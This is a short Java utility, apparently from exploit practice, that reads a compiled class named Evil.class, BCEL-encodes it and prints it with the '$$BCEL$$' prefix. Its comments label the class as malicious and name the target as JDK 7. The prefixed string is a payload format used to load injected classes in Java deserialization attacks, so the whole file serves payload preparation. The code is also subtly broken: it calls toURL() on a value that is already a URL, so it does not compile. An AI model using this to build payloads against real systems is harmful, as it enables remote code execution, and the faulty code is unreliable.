import com.sun.org.apache.bcel.internal.classfile.Utility;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;

// 加载恶意类,版本：jdk7
public class Util{
	public static void main(String[] args) throws Exception{
		//将 Evil的class 转换为 URL链接
		URL uri = Util.class.getResource("Evil.class").toURL();
		byte[] bytes = Files.readAllBytes(Paths.get(uri));
		String bcel = Utility.encode(bytes,true);
		System.out.println("$$BCEL$$"+ bcel);
	}
}